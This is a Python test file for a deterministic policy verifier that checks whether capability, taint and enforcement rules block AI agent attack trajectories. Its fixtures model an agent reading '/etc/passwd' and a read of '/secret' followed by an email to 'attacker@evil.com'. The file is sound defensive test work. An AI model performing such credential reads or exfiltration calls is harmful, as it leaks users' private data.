"""Tests for the deterministic SAMOS policy verifier."""

from __future__ import annotations

import pytest

from agent_hardener.shared.schemas import (
    AgentTrajectory,
    AttackIteration,
    AttackIntensity,
    AttackRecord,
    CapabilityAnnotations,
    ConfidentialityAnnotations,
    ConfidentialityLevel,
    ContainerEnforcement,
    DeploymentSpec,
    EnforcementAction,
    EnforcementRule,
    FailureType,
    GatewayEnforcementSpec,
    GatewayPolicyRule,
    HarmCategory,
    PolicyCoverage,
    RedAgentFeedbackSchema,
    SAMOSPolicy,
    SessionTaintRules,
    TaintLevel,
    TaintPropagationRule,
    ToolAnnotation,
    ToolCall,
)
from agent_hardener.verifier import (
    VerifierVerdictStatus,
    compute_deterministic_coverage,
    verify_attack_record,
)


# ── Builders ──────────────────────────────────────────────────────────────────


def _policy(
    *,
    tool_name: str = "read_file",
    read_conf: ConfidentialityLevel = ConfidentialityLevel.HIGH,
    write_conf: ConfidentialityLevel = ConfidentialityLevel.HIGH,
    filesystem=False,
    network=False,
    execution=False,
    environment=False,
    enforcement_rules: list[EnforcementRule] | None = None,
    initial_taint: TaintLevel = TaintLevel.LOW,
    target_tool_write_conf: ConfidentialityLevel | None = None,
) -> SAMOSPolicy:
    annotation = ToolAnnotation(
        name=tool_name,
        description="",
        read_confidentiality=read_conf,
        write_confidentiality=target_tool_write_conf or write_conf,
        network=network,
        filesystem=filesystem,
        environment=environment,
        execution=execution,
        software_libraries=False,
    )
    gateway = GatewayEnforcementSpec(
        tool_annotation=annotation,
        session_initial_taint=initial_taint,
        taint_is_monotonic=True,
        fail_secure_unknown_tools=True,
        policy_log_required=True,
        core_policy_rules=[],
        red_agent_feedback_schema=RedAgentFeedbackSchema(),
    )
    return SAMOSPolicy(
        tool_name=tool_name,
        policy_version="1.0",
        generated_from_attack_cycles=1,
        confidentiality_annotations=ConfidentialityAnnotations(
            read_confidentiality=read_conf,
            write_confidentiality=write_conf,
            read_justification="",
            write_justification="",
        ),
        capability_annotations=CapabilityAnnotations(
            network=network,
            filesystem=filesystem,
            environment=environment,
            execution=execution,
            software_libraries=False,
        ),
        session_taint_rules=SessionTaintRules(
            initial_session_taint=initial_taint,
            taint_propagation_rules=[],
        ),
        enforcement_rules=enforcement_rules or [],
        gateway_enforcement=gateway,
        deployment_spec=DeploymentSpec(isolation_level="separate_container", container_enforcements=[]),
        policy_coverage=PolicyCoverage(),
    )


def _record(
    *,
    record_id: str = "ATK-001-cybercrime",
    final_score: float = 0.99,
    tool_calls: list[ToolCall] | None = None,
    refusal: bool = False,
    harm: HarmCategory = HarmCategory.CYBERCRIME,
    attack_chain: list[str] | None = None,
) -> AttackRecord:
    tool_calls = tool_calls or []
    trajectory = AgentTrajectory(
        prompt="x",
        tool_calls=tool_calls,
        refusal_detected=refusal,
        refusal_message="refused" if refusal else "",
    )
    iteration = AttackIteration(
        attempt_number=0,
        prompt_used="x",
        trajectory=trajectory,
        score=final_score,
        success=final_score > 0.95,
        failure_type=FailureType.NOT_APPLICABLE,
    )
    return AttackRecord(
        record_id=record_id,
        harm_category=harm,
        tool_targeted="read_file",
        attack_intensity=AttackIntensity.EASY,
        attack_chain=attack_chain or [tc.tool_name for tc in tool_calls] or ["read_file"],
        final_prompt_used="x",
        attempt_number_of_success=0 if final_score > 0.95 else None,
        final_score=final_score,
        refusal_occurred=refusal,
        refusal_attempt_number=0 if refusal else None,
        successful_tool_calls=[tc for tc in tool_calls if tc.success],
        failed_tool_calls=[tc for tc in tool_calls if not tc.success],
        failure_type=FailureType.NOT_APPLICABLE,
        attack_trajectory=[iteration],
    )


# ── Capability gate ───────────────────────────────────────────────────────────


class TestCapabilityGate:
    def test_filesystem_denied_blocks_read_file(self):
        policy = _policy(filesystem=False)
        record = _record(tool_calls=[
            ToolCall(tool_name="read_file", parameters={"path": "/etc/passwd"}, success=True),
        ])
        verdict = verify_attack_record(record, policy)
        assert verdict.final_status == VerifierVerdictStatus.BLOCKED
        assert "read_file:filesystem" in verdict.triggered_capability_denials
        assert verdict.first_blocking_step == 0

    def test_network_denied_blocks_send_email(self):
        policy = _policy(tool_name="send_email", read_conf=ConfidentialityLevel.LOW, network=False)
        record = _record(tool_calls=[
            ToolCall(tool_name="send_email", parameters={"to": "x@y.com"}, success=True),
        ])
        verdict = verify_attack_record(record, policy)
        assert verdict.final_status == VerifierVerdictStatus.BLOCKED
        assert "send_email:network" in verdict.triggered_capability_denials

    def test_unrestricted_capability_does_not_block(self):
        # An allowed-set (list) is treated as "not outright denied".
        policy = _policy(filesystem=["/tmp"])
        record = _record(tool_calls=[
            ToolCall(tool_name="read_file", parameters={"path": "/tmp/a"}, success=True),
        ])
        verdict = verify_attack_record(record, policy)
        assert verdict.final_status != VerifierVerdictStatus.BLOCKED


# ── Taint gate ────────────────────────────────────────────────────────────────


class TestTaintGate:
    def test_high_read_then_low_write_blocks(self):
        # read_file is the policy's target, read_conf=HIGH → tainted.
        # send_email writes low (heuristic prefix), so the flow is blocked.
        policy = _policy(
            tool_name="read_file",
            read_conf=ConfidentialityLevel.HIGH,
            write_conf=ConfidentialityLevel.HIGH,
            filesystem=True,
            network=True,
        )
        record = _record(tool_calls=[
            ToolCall(tool_name="read_file", parameters={"path": "/secret"}, success=True),
            ToolCall(tool_name="send_email", parameters={"to": "attacker@evil.com"}, success=True),
        ])
        verdict = verify_attack_record(record, policy)
        assert verdict.final_status == VerifierVerdictStatus.BLOCKED
        assert verdict.taint_violation is True
        assert "IFC-001-HIGH-TO-LOW" in verdict.triggered_rule_ids
        assert verdict.first_blocking_step == 1
        assert verdict.final_taint == TaintLevel.HIGH

    def test_low_read_then_low_write_does_not_taint(self):
        policy = _policy(
            tool_name="list_directory",
            read_conf=ConfidentialityLevel.LOW,
            write_conf=ConfidentialityLevel.LOW,
            filesystem=True,
            network=True,
        )
        record = _record(tool_calls=[
            ToolCall(tool_name="list_directory", parameters={"path": "/tmp"}, success=True),
            ToolCall(tool_name="send_email", parameters={"to": "ok@x.com"}, success=True),
        ])
        verdict = verify_attack_record(record, policy)
        assert verdict.final_status == VerifierVerdictStatus.UNMITIGATED
        assert verdict.taint_violation is False


# ── Enforcement-rule gate ─────────────────────────────────────────────────────


class TestEnforcementRuleGate:
    def test_block_rule_referencing_tool_name_fires(self):
        rule = EnforcementRule(
            rule_id="ENF-001",
            trigger_condition="Block calls to send_email with external recipients",
            action=EnforcementAction.BLOCK,
            reason="exfil guard",
            motivated_by_attack="ATK-001-cybercrime",
        )
        policy = _policy(
            tool_name="read_file",
            read_conf=ConfidentialityLevel.LOW,  # avoid taint gate firing first
            write_conf=ConfidentialityLevel.LOW,
            filesystem=True,
            network=True,
            enforcement_rules=[rule],
        )
        record = _record(tool_calls=[
            ToolCall(tool_name="read_file", parameters={}, success=True),
            ToolCall(tool_name="send_email", parameters={"to": "x@y.com"}, success=True),
        ])
        verdict = verify_attack_record(record, policy)
        assert verdict.final_status == VerifierVerdictStatus.BLOCKED
        assert "ENF-001" in verdict.triggered_rule_ids
        assert verdict.first_blocking_step == 1

    def test_audit_rule_marks_partially_mitigated(self):
        rule = EnforcementRule(
            rule_id="ENF-002",
            trigger_condition="Audit calls to read_file",
            action=EnforcementAction.AUDIT,
            reason="log sensitive reads",
            motivated_by_attack="ATK-001-cybercrime",
        )
        policy = _policy(
            read_conf=ConfidentialityLevel.LOW,
            write_conf=ConfidentialityLevel.LOW,
            filesystem=True,
            enforcement_rules=[rule],
        )
        record = _record(tool_calls=[
            ToolCall(tool_name="read_file", parameters={}, success=True),
        ])
        verdict = verify_attack_record(record, policy)
        assert verdict.final_status == VerifierVerdictStatus.AUDITED
        assert "ENF-002" in verdict.triggered_rule_ids

    def test_confirmation_only_marks_requires_confirmation(self):
        rule = EnforcementRule(
            rule_id="ENF-003",
            trigger_condition="Require confirmation for read_file",
            action=EnforcementAction.REQUIRE_CONFIRMATION,
            reason="human-in-the-loop",
            motivated_by_attack="ATK-001-cybercrime",
        )
        policy = _policy(
            read_conf=ConfidentialityLevel.LOW,
            write_conf=ConfidentialityLevel.LOW,
            filesystem=True,
            enforcement_rules=[rule],
        )
        record = _record(tool_calls=[
            ToolCall(tool_name="read_file", parameters={}, success=True),
        ])
        verdict = verify_attack_record(record, policy)
        assert verdict.final_status == VerifierVerdictStatus.REQUIRES_CONFIRMATION

    def test_unrelated_rule_does_not_fire(self):
        rule = EnforcementRule(
            rule_id="ENF-OTHER",
            trigger_condition="Block calls to delete_user",
            action=EnforcementAction.BLOCK,
            reason="prod safety",
            motivated_by_attack="ATK-XYZ",
        )
        policy = _policy(
            read_conf=ConfidentialityLevel.LOW,
            write_conf=ConfidentialityLevel.LOW,
            filesystem=True,
            enforcement_rules=[rule],
        )
        record = _record(tool_calls=[
            ToolCall(tool_name="read_file", parameters={}, success=True),
        ])
        verdict = verify_attack_record(record, policy)
        assert verdict.final_status == VerifierVerdictStatus.UNMITIGATED
        assert verdict.triggered_rule_ids == []


# ── Refusal and empty trajectories ────────────────────────────────────────────


class TestEdgeCases:
    def test_empty_trajectory_reports_unmitigated_with_note(self):
        policy = _policy(read_conf=ConfidentialityLevel.LOW, write_conf=ConfidentialityLevel.LOW)
        record = _record(tool_calls=[])
        verdict = verify_attack_record(record, policy)
        assert verdict.final_status == VerifierVerdictStatus.UNMITIGATED
        assert any("no tool calls" in n.lower() for n in verdict.notes)

    def test_no_trajectory_at_all(self):
        # Force an AttackRecord with empty attack_trajectory
        record = AttackRecord(
            record_id="ATK-EMPTY",
            harm_category=HarmCategory.FRAUD,
            tool_targeted="read_file",
            attack_chain=["read_file"],
            final_prompt_used="x",
            final_score=0.0,
            attack_trajectory=[],
        )
        policy = _policy()
        verdict = verify_attack_record(record, policy)
        assert verdict.final_status == VerifierVerdictStatus.UNMITIGATED


# ── Aggregator ────────────────────────────────────────────────────────────────


class TestCoverageAggregation:
    def test_coverage_counts_only_successful_attacks(self):
        policy = _policy(filesystem=False)
        records = [
            _record(record_id="ATK-001-fraud", final_score=0.99, tool_calls=[
                ToolCall(tool_name="read_file", parameters={}, success=True),
            ]),
            _record(record_id="ATK-002-fraud", final_score=0.10, tool_calls=[
                ToolCall(tool_name="read_file", parameters={}, success=True),
            ]),
        ]
        coverage, verdicts = compute_deterministic_coverage(records, policy)
        # Only ATK-001 counts (success > threshold), and it's blocked by filesystem=False.
        assert coverage.attacks_fully_blocked_by_policy == 1
        assert coverage.attacks_partially_mitigated == 0
        assert coverage.unmitigated_attacks == 0
        # Verdicts always include every record so reviewers can audit both.
        assert len(verdicts) == 2

    def test_unmitigated_with_refusal_counts_as_model_level(self):
        policy = _policy(
            read_conf=ConfidentialityLevel.LOW,
            write_conf=ConfidentialityLevel.LOW,
            filesystem=True,
        )
        # Successful attack (high score) but the agent refused at some point —
        # policy doesn't catch it, so credit goes to model-level defense.
        record = _record(
            final_score=0.99,
            refusal=True,
            tool_calls=[ToolCall(tool_name="read_file", parameters={}, success=True)],
        )
        coverage, _ = compute_deterministic_coverage([record], policy)
        assert coverage.attacks_requiring_model_level_defense == 1
        assert coverage.attacks_fully_blocked_by_policy == 0

    def test_mixed_outcomes_aggregate_correctly(self):
        block_rule = EnforcementRule(
            rule_id="ENF-EXFIL",
            trigger_condition="Block send_email when session is high-tainted",
            action=EnforcementAction.BLOCK,
            reason="exfil",
            motivated_by_attack="ATK-001",
        )
        audit_rule = EnforcementRule(
            rule_id="ENF-AUDIT-LIST",
            trigger_condition="Audit calls to list_directory",
            action=EnforcementAction.AUDIT,
            reason="log",
            motivated_by_attack="ATK-002",
        )
        policy = _policy(
            tool_name="read_file",
            read_conf=ConfidentialityLevel.LOW,
            write_conf=ConfidentialityLevel.LOW,
            filesystem=True,
            network=True,
            enforcement_rules=[block_rule, audit_rule],
        )
        records = [
            # 1) blocked by ENF-EXFIL
            _record(
                record_id="ATK-001-fraud",
                final_score=0.99,
                tool_calls=[ToolCall(tool_name="send_email", parameters={}, success=True)],
            ),
            # 2) audited by ENF-AUDIT-LIST → partially mitigated
            _record(
                record_id="ATK-002-fraud",
                final_score=0.99,
                tool_calls=[ToolCall(tool_name="list_directory", parameters={}, success=True)],
            ),
            # 3) untouched by any rule, no refusal → unmitigated
            _record(
                record_id="ATK-003-fraud",
                final_score=0.99,
                tool_calls=[ToolCall(tool_name="read_file", parameters={}, success=True)],
            ),
        ]
        coverage, _ = compute_deterministic_coverage(records, policy)
        assert coverage.attacks_fully_blocked_by_policy == 1
        assert coverage.attacks_partially_mitigated == 1
        assert coverage.unmitigated_attacks == 1
        assert coverage.attacks_requiring_model_level_defense == 0
